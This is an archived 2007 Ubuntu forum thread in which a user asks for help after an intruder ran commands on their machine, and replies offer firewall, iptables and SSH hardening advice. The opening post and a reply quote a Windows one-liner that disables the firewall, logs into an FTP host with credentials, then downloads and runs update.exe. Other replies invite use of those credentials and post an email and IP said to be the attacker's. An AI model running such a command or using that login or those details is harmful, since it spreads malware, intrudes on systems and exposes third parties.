---
title: "Help me get rid of an intruder"
date: 2007-06-21
forum: Server Platforms
---

### Post by dir7bag on 2007-06-21
So, when I got home today I noticed a new up near the 'updates' icon and a few programs running that weren't running when I left.  This was telling me that someone was connected to my computer (adsl-75-7-255-165.dsl.applwi.sbcglobal.net).  I disconnected the user and then opened the terminal.  Cycling through the recent commands I found only the text below before seeing the commands I was using this morning.

```
cmd /c net stop SharedAccess &echo open punkt.5gigs.com 21 >> ij &echo user punk4214 bond007 >> ij &echo binary >> ij &echo get update.exe >> ij &echo bye >> ij &ftp -n -v -s:ij &del ij &update.exe &net start SharedAccess &exit
```

This appears to be an attempt to turn off a Windows firewall, download a program and then turn on the firewall.

The puzzling thing is that I have disabled everything but port 80 on my router.  Does anyone have any suggestions on fixing this intruder issue?

I had previously been working on a slowness issue, which may be related to an intruder
[http://ubuntuforums.org/showthread.php?t=479494](http://ubuntuforums.org/showthread.php?t=479494)

---

### Post by Bluecircle on 2007-06-21
Well you can login to their FTP

punkt.5gigs.com

User: punk4214
Pass: bond007

the update.exe shouldn't do anything as it's intended for Windows, so you win. 

Run
```

ps -e

```
and look for anything unusual. Also, get firestarter for a firewall.

```

sudo aptitude install firestarter

```

Firestarter is a complete firewall tool for Linux machines. It
features an easy to use firewall wizard to quickly create a
firewall. Using the program you can then open and close ports
with a few clicks, or stealth your machine giving access only
to a select few. The real-time hit monitor shows attackers
probing your machine.

---

### Post by wormser on 2007-06-21
> **Bluecircle said:**
> Well you can login to their FTP

punkt.5gigs.com

User: punk4214
Pass: bond007

the update.exe shouldn't do anything as it's intended for Windows, so you win. 


First off, how did you get their user name and password?  

If they got in then couldn't they have installed something else?

---

### Post by Bluecircle on 2007-06-21
> **wormser said:**
> First off, how did you get their user name and password?  

If they got in then couldn't they have installed something else?

It's right in the code:

cmd /c net stop SharedAccess &echo open **punkt.5gigs.com** 21 >> ij &echo user **punk4214** **bond007** >> ij &echo binary >> ij &echo get update.exe >> ij &echo bye >> ij &ftp -n -v -s:ij &del ij &update.exe &net start SharedAccess &exit

It's a windows command. cmd opens command, then the service "SharedAccess" is stopped, then they open "punkt.5gigs.com" with ftp, using the username and password "user punk4214 bond007", the file update.exe is downloaded in binary mode, then the ftp is closed, he runs update.exe and then restarts the SharedAccess service.

Nothing could be installed because update.exe is meant for windows, and he's not running windows. It's probably a trojan or worm, but you're immune to it running Linux.

---

### Post by Bluecircle on 2007-06-21
Here's the guy's email: [email]punkt.art@gmail.com[/email]

and ip: 80.133.192.238

---

### Post by NeoLithium on 2007-06-21
> **Bluecircle said:**
> Here's the guy's email: [email]punkt.art@gmail.com[/email]

and ip: 80.133.192.238

First off. I'm rolling on the floor laughing.  This is hilarious cause it seems like a portion of the community just went to war with getting this info.  Secondly, I don't condone it, but hey, this just made me smile and laugh so hard. 

I'd just install firestarter, ensure you keep strong passwords and of course laugh cause he's trying to use windows commands inside a linux shell.  Sounds something like a script kiddie WAY more than anyone who would know something.

---

### Post by freshmeatz on 2007-06-21
> **NeoLithium said:**
> First off. I'm rolling on the floor laughing.  This is hilarious cause it seems like a portion of the community just went to war with getting this info.  Secondly, I don't condone it, but hey, this just made me smile and laugh so hard. 

I'd just install firestarter, ensure you keep strong passwords and of course laugh cause he's trying to use windows commands inside a linux shell.  Sounds something like a script kiddie WAY more than anyone who would know something.

hehe :) yeah that is funny

---

### Post by Chemroydal Tissue on 2007-06-21
Hehe. Maybe this should (also) be in Testimonials, since it clearly illustrates one advantage of using Ubuntu over a flavour of Windows. This may just be Thread of the Year, it made me chuckle so (if there isn't a TotY, then there should be).

---

### Post by dir7bag on 2007-06-21
Well, I certainly appreciate all of the help and I am happy to provide some entertainment. :popcorn:

I have installed and configured firestarter, which is very simple for the amount of customization available.  I can't believe the amount of random connection attempts.

And now to decide whether or not I should contact my new friend :p.

---

### Post by wormser on 2007-06-21
> **dir7bag said:**
> Well, I certainly appreciate all of the help and I am happy to provide some entertainment. :popcorn:

I have installed and configured firestarter, which is very simple for the amount of customization available.  I can't believe the amount of random connection attempts.

And now to decide whether or not I should contact my new friend :p.

It might not even be them.  They could have got hacked and somebody else is using them.  So you should contact them and let them be aware of the situation.

---

### Post by bardgd on 2007-06-21
It looks like you have a root kit.  Basically how that gets on your system is you went to a web site and downloaded a program and installed it.  Secretly within that program was another program and it installed itself on your system.  Do an extensive virus scan may find it.  Do a search on the internet(Google) for that link and you may find the directions for removing the intruder.

---

### Post by Bluecircle on 2007-06-21
> **bardgd said:**
> It looks like you have a root kit.  Basically how that gets on your system is you went to a web site and downloaded a program and installed it.  Secretly within that program was another program and it installed itself on your system.  Do an extensive virus scan may find it.  Do a search on the internet(Google) for that link and you may find the directions for removing the intruder.

A rootkit for linux downloaded off a website? What's the chance of that? If he's not behind a router, firewall, or any other type of device blocking random connection attempts, anyone could have connected and tried to do that.

---

### Post by dir7bag on 2007-06-22
I am behind a router (and now a firewall), but for some reason the router was letting these connections in.  I had a few port ranges entered, but the checkbox to enable/disable was unchecked.  I am wondering if the router disregards this checkbox.  I have set these ports to 0-0 and to forward to 0.  I will watch firestarter and see if this was the problem.

Also, the only software I have installed is through synaptic.

---

### Post by wieman01 on 2007-06-22
Any other service running on your system? E.g. telnet, SSH, FTP or something like that? What service was the intruder using in order to log on to it in the first place?

---

### Post by EndPerform on 2007-06-22
> **Bluecircle said:**
> A rootkit for linux downloaded off a website? What's the chance of that? If he's not behind a router, firewall, or any other type of device blocking random connection attempts, anyone could have connected and tried to do that.

Higher than you think actually.  By default, Ubuntu doesn't have any services running for someone to attempt to connect to.  He may have installed a service or two and quite possibly downloaded a questionable piece of software and ended up with someone trying to get into his system.

---

### Post by eldragon on 2007-06-22
well, not related, but i found out today someone managed to get into my system through the ssh port (which i use to tunnel myself into the desktop, and vnc from uni).

i had a couple of dummy accounts i now deleted with weak passwords.

the intruder started probing the system for vulnerabilites...

ive posted a thread about random lockups here: [http://ubuntuforums.org/showthread.php?p=2886464#post2886464](http://ubuntuforums.org/showthread.php?p=2886464#post2886464)

now ive closed the port 22. killed those users and their home folders. rebooted to make sure nothing stayed running. and im back in business.

im still waiting to see if there are computer locks up. so far so good. but it took from 12 to 72 hours from lockup to lockup.

thanks god i keep all my stuff under my account, with a strong password and no access to other users. the root account has an even stronger password :D

Now the question: is there any way i could enable port 22 and still be secure from intruders? i wouldnt like to have people bruteforcing on me. is there any way to automatically shutdown a port after a certain ammount of connecton failures?

---

### Post by dir7bag on 2007-06-22
> **wieman01 said:**
> Any other service running on your system? E.g. telnet, SSH, FTP or something like that? What service was the intruder using in order to log on to it in the first place?

I have ssh running, but the port is supposedly disabled in my router (Linksys WRT54G v2.2 with newest Linksys firmware).  The intruder was logged in using the remote desktop feature.  I know I should logout or at least lock the screen when I leave, I just didn't this time.

I am not sure exactly how the user connected.  This is a new server and I have been using Linux for a little over a month now.  I didn't have a firewall running on the box as I thought my router's NAT would work for me until I got around to setting up the firewall.  I guess I underestimated the amount of people in this world who have too much time on their hands.

Also, unfortunately the logging feature on my router does not work properly.  I guess I will be installing a 3rd party firmware soon as well.

I will recommend to any new user to install/configure the firewall before doing anything else.

---

### Post by dir7bag on 2007-06-22
> **eldragon said:**
> Now the question: is there any way i could enable port 22 and still be secure from intruders? i wouldnt like to have people bruteforcing on me. is there any way to automatically shutdown a port after a certain ammount of connecton failures?

I found this while researching my own server slowdown/lockup issue.  These commands will set up your iptables to reject anyone with 3 new connections from the same address in a five minute span (you can obviously change that to your liking).  The article applies to Fedora, but I assume it will work just fine for Ubuntu.

[http://lj4newbies.blogspot.com/2007/05/firewall-with-iptables.html](http://lj4newbies.blogspot.com/2007/05/firewall-with-iptables.html)

```
iptables -I INPUT -p tcp -i eth+ --dport 22 -m state --state NEW -m recent --set
iptables -I INPUT -p tcp -i eth+ --dport 22 -m state --state NEW -m recent --update --seconds 300 --hitcount 3 -j DROP

service iptables save
```

---

### Post by eentonig on 2007-06-22
...Or just don't open any public services like ssh/vnc/... without knowing how to protect you.

I have an ssh server running to get on my box and I don't have any problems whatsoever.

What I do recommend.

snort - So brute force attacks get blocked.
logcheck - to get log extracts mailed to me with things I want to know about.

---

### Post by eldragon on 2007-06-22
ok, downloaded snort now.

it made me make it choose where to listen to: i picked 192.168.10.0/24 which would listen to all incoming packets from my LAN (includding my router, isnt that right?)

ive resorted to this since i dont trust wireless lans :)

anything else i should know before opening port 22?

cheers

---

### Post by wieman01 on 2007-06-22
> **dir7bag said:**
> I have ssh running, but the port is supposedly disabled in my router (Linksys WRT54G v2.2 with newest Linksys firmware).  The intruder was logged in using the remote desktop feature.  I know I should logout or at least lock the screen when I leave, I just didn't this time.

I am not sure exactly how the user connected.  This is a new server and I have been using Linux for a little over a month now.  I didn't have a firewall running on the box as I thought my router's NAT would work for me until I got around to setting up the firewall.  I guess I underestimated the amount of people in this world who have too much time on their hands.

Also, unfortunately the logging feature on my router does not work properly.  I guess I will be installing a 3rd party firmware soon as well.

I will recommend to any new user to install/configure the firewall before doing anything else.
I have a Linksys too and upgraded the firmware with DD-WRT. Great project and seamless open-source firmware. Might suit your needs as well. 

[http://www.dd-wrt.com/dd-wrtv2/index.php]("http://www.dd-wrt.com/dd-wrtv2/index.php")

And use Firestarter to configure IP tables (in the repositories). I use it and it's a very reliable tool.

---

### Post by Biochem on 2007-06-22
> **eldragon said:**
> ok, downloaded snort now.

it made me make it choose where to listen to: i picked 192.168.10.0/24 which would listen to all incoming packets from my LAN (includding my router, isnt that right?)

ive resorted to this since i dont trust wireless lans :)

anything else i should know before opening port 22?

cheers

How about NOT using port 22 and use a private key authentication?

---

### Post by eldragon on 2007-06-28
> **Biochem said:**
> How about NOT using port 22 and use a private key authentication?

im on the begining of the learning curve. and im being thrown lots of concepts i can hardly grasp....

ive been reading lots about securing. since i plan to use SSH.

tell me more about that private key? lets hope it doesnt mean me carrying a 128bit key everywhere i plan to use SSH, cause thats would be more trouble.

how do the pros do it? :)

another thing that might be an issue. ive got a local lan, which i dont want to secure. i want it wide open for my family, friends. etcetera. so samba requires  me to create a guest account. with NO password.  how do i restrict the users that can login from ssh? again, im a total noob, and need to learn a LOT.

i guess im going way off topic, but im popping questions as the arise.....


thanks for the answers...

---

### Post by Alterax on 2007-06-29
Do you have your remote desktop option turned on?  Remote Desktop access is based on VNC, which has a security flaw in that the passwords are sent by plaintext.  Couple that with a poorly-hardened router/cable modem system and you're asking for trouble.

I saw something like this at a customer site once.  VNC was sniffed by a program that proceeded to open a windows command prompt and download a file from a site.  Not good.

So here is what you do:  Change your admin passwords, to start off with.  If you don't actually use remote desktop, don't let others connect.  Turn it off and remove the threat.

Install firestarter.  You say that your cable modem is only configured for port 80.  Chances are that is for outgoing connections, since most initial contact with websites is through ports 80 and 443 (80 for HTTP, 443 for HTTPS).  Use firestarter to block the Internet side of the ports--you can even block 80 and 443 unless you are hosting a website ON YOUR COMPUTER.  Let whatever you want from your side out, but only let in what is absolutely vital to what you do.  Lock out what isn't.

Also, there is an option in your network settings for "discover network devices" or something like that.  It mentions it does include  a security risk.  You may want to uncheck it, just to be on the safe side (I think it's either an implementation of NetBIOS (Old Windows network naming system), SNMP (Simple Network Management Protocol) or UPnP (Universal Plug N Play).  Haven't checked yet, but all three of these fit with the description above--and each are known for security vulnerabilities.

SO:

Change your passwords.
Get rid of special access programs that you don't use
Disable unnecessary networking services
Put in your firewall--and configure it correctly (We'll help you.  Promise).

Best of luck!

--Alterax

---

### Post by eldragon on 2007-06-29
Alterax, you apparently misunderstood my predicament.

i DO want to be able to connect from the outside. (both vnc and ssh)
im looking for the safest way to do so. thats it.

---

### Post by Biochem on 2007-06-30
> **eldragon said:**
> im on the begining of the learning curve. and im being thrown lots of concepts i can hardly grasp....

ive been reading lots about securing. since i plan to use SSH.

tell me more about that private key? lets hope it doesnt mean me carrying a 128bit key everywhere i plan to use SSH, cause thats would be more trouble.

how do the pros do it? :)

another thing that might be an issue. ive got a local lan, which i dont want to secure. i want it wide open for my family, friends. etcetera. so samba requires  me to create a guest account. with NO password.  how do i restrict the users that can login from ssh? again, im a total noob, and need to learn a LOT.

i guess im going way off topic, but im popping questions as the arise.....


thanks for the answers...

Since I'm new myself I don't know how the pros do it but I followed some of the following instruction

[https://help.ubuntu.com/community/AdvancedOpenSSH](https://help.ubuntu.com/community/AdvancedOpenSSH)

it will instruct you on how to change the listening port and use public key authentication. I use key authentication to access my server from my laptop and I have a thumb drive with portable putty and winscp for access from other computer. 

I hope it help

---

### Post by insane_alien on 2007-06-30
its more of a 1024-bit key than a 128-bit.

---

### Post by weth on 2007-07-26
Hi all,

I have been receiving too many ICMP hits these last two days and I know this through Firestarter and the /var/log/messages! I have "ICMP filtering" turned on in Firestarter. All of them blocked! About 50 in for an hour! I checked that they are type no.3, which means "destination unreachable" - I guess this is what the other side reads. I would have ignored them if they were not too many and if not shown in red in Firestarter, and I can not rely upon my own judgement wheather they are dangerous or not.

I have been  downloading a couple of films through Ktorrent and thought this may be the real cause for these but after I checked all the ip's , those from which I receive the ICMP hits were not among my torrent peers, so I guess Ktorrent has nothing to do with it :confused:

I have had two unsuccessful installations of Snort these days, maybe I should try again and again ...what do you think, should I be worried or not?

---

### Post by weth on 2007-07-27
Ok then I'll put it this way:

Is running Ktorrent (or any other torrent program) an additional threat to my system?
if 'yes', is there anything to be done to secure the machine except turning it off?

Are all those numerous ICMP hits (shown in red in Firestarter) actually pings to my computer or if not, what else could they be?

thanks :)

---

### Post by kah00na on 2007-08-01
What username actually ran that command?  I hope it wasn't root.  You can do a "last" to see what users have logged into your system.

---

### Post by kah00na on 2007-08-01
You can also run "lastb" to see the failed logins... assuming you have a /var/tmp/btmp file. 

If you don't have that file, just "touch" it and then it should start logging the failed logins.  Another cool thing to do is to modify the /etc/login.defs and change this entry:
     LOG_UNKFAIL_ENAB                 no
to:
     LOG_UNKFAIL_ENAB                 yes

This will log the bad user IDs that anyone puts in to the "login" entry.  If you have others logging into your box, then you should probably take away the world read permissions from this file like this just to keep snooping eyes out of it:
     chmod o-r /var/log/btmp

---

